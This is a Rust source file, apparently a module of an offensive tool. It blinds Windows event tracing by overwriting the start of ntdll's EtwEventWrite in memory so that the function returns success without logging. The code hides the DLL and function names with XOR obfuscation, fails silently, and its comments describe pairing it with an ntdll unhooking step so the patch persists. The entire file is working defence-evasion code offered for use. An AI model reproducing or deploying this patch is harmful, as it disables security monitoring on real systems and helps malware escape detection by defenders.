// evasion.rs — ETW bypass via EtwEventWrite byte patch
//
// Overwrites the first 3 bytes of ntdll!EtwEventWrite with:
//   xor eax, eax   (33 C0)
//   ret             (C3)
//
// All subsequent ETW calls return STATUS_SUCCESS without logging.
// Function name is XOR-obfuscated. Fails silently.
//
// When paired with ntdll_unhook, ensure unhook runs FIRST so this
// patch is applied to the clean (unhooked) copy and persists.

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

const KEY: u8 = 0x4E;

const fn obf<const N: usize>(s: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N { out[i] = s[i] ^ KEY; i += 1; }
    out
}

fn dec(enc: &[u8]) -> Vec<u8> { enc.iter().map(|&b| b ^ KEY).collect() }

const OBF_NTDLL:  [u8; 10] = obf(b"ntdll.dll\0");
const OBF_ETW_FN: [u8; 14] = obf(b"EtwEventWrite\0");

pub fn evade() {
    unsafe { let _ = patch_etw(); }
}

unsafe fn patch_etw() -> windows::core::Result<()> {
    let patch: [u8; 3] = [0x33, 0xC0, 0xC3]; // xor eax, eax; ret

    let dll_name = dec(&OBF_NTDLL);
    let fn_name  = dec(&OBF_ETW_FN);

    let h_module = GetModuleHandleA(PCSTR(dll_name.as_ptr()))?;
    let address  = GetProcAddress(h_module, PCSTR(fn_name.as_ptr()))
        .ok_or_else(windows::core::Error::from_win32)? as *mut u8;

    let mut old = PAGE_PROTECTION_FLAGS(0);
    VirtualProtect(address.cast(), patch.len(), PAGE_EXECUTE_READWRITE, &mut old)?;
    std::ptr::copy_nonoverlapping(patch.as_ptr(), address, patch.len());
    VirtualProtect(address.cast(), patch.len(), old, &mut old)?;
    Ok(())
}
